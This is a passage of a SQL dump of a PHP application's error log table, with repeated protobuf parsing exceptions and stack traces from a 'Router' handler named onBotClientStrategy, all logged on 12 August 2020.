(104, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:33:04'),
(105, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xE1\\xF4\\x14v\\xFF\\xFE0[A\\xBC/\\xC9c\\xC6\\xFB...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:33:06'),
(106, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xCD\\x9D\'0\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xCD\\x9D\'0\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xCD\\x9D\'0\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:33:07'),
(107, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xCD\\x9D\'0\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xCD\\x9D\'0\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xCD\\x9D\'0\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:33:08'),
(108, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xCD\\x9D\'0\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xCD\\x9D\'0\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xCD\\x9D\'0\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:33:10'),
(109, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xCD\\x9D\'0\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xCD\\x9D\'0\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xCD\\x9D\'0\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:33:11'),
(110, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xCD\\x9D\'0\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xCD\\x9D\'0\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xCD\\x9D\'0\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:33:12'),
(111, 'Router', 'onBotClientStrategy (exception)', 'Exception: Expected type:4 but had  in /var/www/html/application/modules/protobuf/message/pb_message.php:221\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\x14\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\x14\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\x14\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:35:56'),
(112, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:36:32'),
(113, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:36:33'),
(114, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'=\\xE8\\x08@\\x04\\x82\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'=\\xE8\\x08@\\x04\\x82\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'=\\xE8\\x08@\\x04\\x82\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:36:35'),
(115, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:36:37'),
(116, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:36:38'),
(117, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:36:40'),
(118, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:36:42'),
(119, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:36:43'),
(120, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:36:44'),
(121, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:36:45'),
(122, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\']\\\\\\xA4\\xFCD>\\x8A\\x86m\\xF0\\xF0C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:36:46'),
(123, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:4 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'l\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'l\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'l\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:36:59'),
(124, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'I\\xEC\\x8B\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'I\\xEC\\x8B\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'I\\xEC\\x8B\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:37:01'),
(125, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'I\\xEC\\x8B\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'I\\xEC\\x8B\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'I\\xEC\\x8B\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:37:02'),
(126, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:4 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'|m\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'|m\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'|m\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:37:20'),
(127, 'Router', 'onBotClientStrategy (exception)', 'Exception: Expected type:0 but had  in /var/www/html/application/modules/protobuf/message/pb_message.php:221\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\x08\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\x08\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\x08\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:37:42'),
(128, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'G\\xCE\\xDB\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'G\\xCE\\xDB\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'G\\xCE\\xDB\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:38:05');
INSERT INTO `logs` (`id`, `controller`, `function`, `log`, `error_time`) VALUES
(129, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'i\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'i\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'i\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:38:06'),
(130, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:6 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'v\\xA9\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'v\\xA9\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'v\\xA9\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:39:46'),
(131, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:4 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\',\\xDA\\x81\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\',\\xDA\\x81\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\',\\xDA\\x81\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:40:35'),
(132, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xD9>\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xD9>\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xD9>\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:40:42'),
(133, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:4 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xF03^\\xB4\\xFE\\x9DW\\x1AL\\xA1\\xBE\\xA1\\xE7*\\xF7...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xF03^\\xB4\\xFE\\x9DW\\x1AL\\xA1\\xBE\\xA1\\xE7*\\xF7...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xF03^\\xB4\\xFE\\x9DW\\x1AL\\xA1\\xBE\\xA1\\xE7*\\xF7...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:41:54'),
(134, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xF1B\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xF1B\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xF1B\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:41:55'),
